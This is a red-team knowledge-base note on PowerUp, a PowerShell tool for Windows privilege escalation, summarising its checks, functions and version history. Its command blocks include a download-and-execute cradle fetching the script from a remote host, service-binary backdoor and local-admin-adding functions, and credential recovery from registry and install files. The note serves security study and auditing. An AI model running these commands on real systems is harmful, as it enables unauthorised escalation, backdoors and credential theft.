---
title: PowerUp
aliases: [PowerUp.ps1, Invoke-AllChecks]
type: tool
domain: [windows-internals, red-team]
tags: [type/tool, domain/red-team, domain/windows-internals, attack/privesc]
source: "[[Source - harmj0y blog]]"
source_url: https://blog.harmj0y.net/powershell/powerup/
verified: true
related: ["[[PowerView]]", "[[PowerUp]]", "[[GhostPack]]", "[[Empire]]", "[[Service Principal Name (SPN)]]", "[[Credential Hunting]]", "[[Privileges and Rights]]"]
created: 2026-06-07
updated: 2026-06-07
---

> [!summary]
> PowerUp is a pure-PowerShell tool for **Windows local privilege escalation enumeration and abuse** — it audits for common misconfigurations (modifiable/unquoted services, DLL hijacks, registry/credential leaks) via `Invoke-AllChecks` and ships abuse functions to exploit them, all while staying off disk.

## What it does
PowerUp checks the local host for common privesc vectors and provides one-shot abuse primitives. The single entry point is **`Invoke-AllChecks`**, which runs every check and prints a status report. It covers four broad categories:

- **Service misconfigurations** — unquoted service paths with spaces, services whose binary the current user can overwrite, and services whose config the user can modify.
- **DLL hijacking** — writable folders in `%PATH%` and hijackable DLL load paths for running/owned processes.
- **Registry / install misconfigs** — `AlwaysInstallElevated` MSI policy, `AutoAdminLogon` plaintext creds.
- **Credential leftovers** — unattended/sysprep install files, McAfee SiteList passwords.

Later versions were refactored onto Matt Graeber's **PSReflect** (in-memory Win32 API access, no disk/binary deps). This replaced noisy `sc.exe`/`whoami.exe`/file-open probes with proper ACL parsing (`QueryServiceObjectSecurity`, token APIs), prioritizing stealth and avoiding host modification during enumeration.

## Key commands/functions

```powershell
# Load
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
# or diskless / in-memory:
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<HOST>/PowerUp.ps1'); Invoke-AllChecks"

# Run every check, save report
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

```powershell
# --- Service enumeration ---
Get-ServiceUnquoted        # unquoted service paths containing spaces
Get-ServiceEXEPerms        # services whose .exe the current user can overwrite
Get-ServicePerms           # services whose config the current user can modify (newer: Get-ModifiableService)
Get-ServiceDetails -ServiceName <SVC>

# --- Service abuse ---
# Overwrite a modifiable service binary with a user-add backdoor (backs up original)
Write-ServiceEXE -ServiceName <SVC> -UserName <USER> -Password <PASS> -Verbose
Restore-ServiceEXE -ServiceName <SVC>     # restore original binary

# Modify a service's binary path to add a local admin (good for modifiable config)
Invoke-ServiceUserAdd -ServiceName <SVC> -UserName <USER> -Password <PASS>

# Newer (PSReflect) helpers
Set-ServiceBinPath -Name <SVC> -binPath "<CMD>"   # ChangeServiceConfig API
```

```powershell
# --- DLL hijacking ---
Invoke-FindDLLHijack [-ExcludeWindows] [-ExcludeProgramFiles] [-ExcludeOwned]
                     # hijackable DLL load paths for running processes (no admin / no SE priv needed)
Invoke-FindPathDLLHijack          # writable %PATH% folders for service DLL planting

# --- Registry / MSI ---
Get-RegAlwaysInstallElevated      # AlwaysInstallElevated => MSIs run elevated
Write-UserAddMSI                  # build MSI that adds a local admin (drop where elevated install runs)
Get-RegAutoLogon                  # AutoAdminLogon plaintext creds from registry

# --- Credential / file leftovers ---
Get-UnattendedInstallFiles        # leftover sysprep/unattend files with plaintext creds
Get-SiteListPassword              # decrypt McAfee SiteList.xml passwords

# --- Recon helpers (PSReflect) ---
Get-CurrentUserTokenGroupSid      # all token group SIDs incl. disabled (replaces whoami.exe)
Get-ModifiablePath -Path <PATH>   # proper file/parent-dir ACL check (replaces Get-ModifiableFile)
```

> [!note] Version notes
> - **v1.1** added DLL hijacking (`Invoke-FindDLLHijack`, `Invoke-FindPathDLLHijack`), `Get-RegAlwaysInstallElevated` + `Write-UserAddMSI`, `Get-RegAutoLogon`, and `Get-UnattendedInstallFiles`.
> - **PSReflect refactor** removed redundant service-control wrappers (now PS-native `Start-Service`/`Stop-Service -Force`/`Set-Service`), renamed functions for clarity (`Get-ModifiableFile`→`Get-ModifiablePath`, `Find-DLLHijack`→`Find-ProcessDLLHijack`), and added `Add-ServiceDacl`, `Get-CurrentUserTokenGroupSid`, `Get-SiteListPassword`, and clean admin-status detection via `GetCurrentProcess`/`OpenProcessToken`/`GetTokenInformation`/`ConvertSidToStringSid`.

## Used in techniques
PowerUp is the standard local-privesc audit step after landing on a Windows host. It feeds into / overlaps with:
- [[Privileges and Rights]] — token/SID enumeration and abuse context
- [[Credential Hunting]] — unattended files, AutoLogon, McAfee SiteList passwords
- [[Credential Storage in Windows]] — plaintext creds recovered from registry/files
- [[Service Principal Name (SPN)]] / service-account context for follow-on abuse
- Part of the broader [[PowerView]] / [[Empire]] / [[GhostPack]] offensive toolset family

## Sources
- PowerUp — https://blog.harmj0y.net/powershell/powerup/
- PowerUp v1.1: Beyond Service Abuse — https://blog.harmj0y.net/powershell/powerup-v1-1-beyond-service-abuse/
- PowerUp: A Usage Guide — https://blog.harmj0y.net/powershell/powerup-a-usage-guide/
- Upgrading PowerUp with PSReflect — https://blog.harmj0y.net/powershell/upgrading-powerup-with-psreflect/
